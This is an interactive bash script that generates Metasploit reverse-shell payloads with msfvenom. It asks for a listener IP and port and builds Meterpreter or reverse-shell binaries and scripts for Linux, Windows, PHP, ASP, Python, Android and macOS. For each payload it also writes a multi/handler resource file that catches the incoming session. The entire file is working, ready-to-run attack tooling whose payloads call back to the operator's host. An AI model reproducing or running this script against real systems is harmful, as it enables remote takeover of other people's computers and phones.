#!/bin/bash

# Ask for IP and port
read -p "Enter LHOST (your IP): " LHOST
read -p "Enter LPORT (listening port): " LPORT

OUTPUT_DIR="./payloads"
mkdir -p "$OUTPUT_DIR"

echo ""
echo "[*] Select the payloads to generate:"
echo "1) Linux (ELF)"
echo "2) Windows (EXE)"
echo "3) PHP"
echo "4) ASP"
echo "5) Python"
echo "6) Android (APK)"
echo "7) macOS (Mach-O)"
echo "8) All"
read -p "Enter your choices (e.g. 1 2 5): " choices

echo ""
for choice in $choices; do
    case $choice in
        1)
            PAYLOAD="linux/x86/meterpreter/reverse_tcp"
            FILE="rev_shell.elf"
            FORMAT="elf"
            HANDLER="handler_linux.rc"
            ;;
        2)
            PAYLOAD="windows/meterpreter/reverse_tcp"
            FILE="rev_shell.exe"
            FORMAT="exe"
            HANDLER="handler_windows.rc"
            ;;
        3)
            PAYLOAD="php/meterpreter_reverse_tcp"
            FILE="rev_shell.php"
            FORMAT="raw"
            HANDLER="handler_php.rc"
            ;;
        4)
            PAYLOAD="windows/meterpreter/reverse_tcp"
            FILE="rev_shell.asp"
            FORMAT="asp"
            HANDLER="handler_asp.rc"
            ;;
        5)
            PAYLOAD="cmd/unix/reverse_python"
            FILE="rev_shell.py"
            FORMAT="raw"
            HANDLER="handler_python.rc"
            ;;
        6)
            PAYLOAD="android/meterpreter/reverse_tcp"
            FILE="rev_shell.apk"
            FORMAT="raw"
            HANDLER="handler_android.rc"
            ;;
        7)
            PAYLOAD="osx/x64/meterpreter_reverse_tcp"
            FILE="rev_shell.macho"
            FORMAT="macho"
            HANDLER="handler_macos.rc"
            ;;
        8)
            echo "[*] Generating all payloads..."
            $0 <<< "$LHOST"$'\n'"$LPORT"$'\n'"1 2 3 4 5 6 7"
            exit
            ;;
        *)
            echo "[!] Invalid option: $choice"
            continue
            ;;
    esac

    msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f $FORMAT -o "$OUTPUT_DIR/$FILE"
    echo "[+] Payload saved to $OUTPUT_DIR/$FILE"

    cat <<EOF > "$OUTPUT_DIR/$HANDLER"
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF

    echo "[+] Handler saved to $OUTPUT_DIR/$HANDLER"
    echo ""
done

echo "[*] Done! You can run a handler with:"
echo "    msfconsole -r $OUTPUT_DIR/handler_<type>.rc"
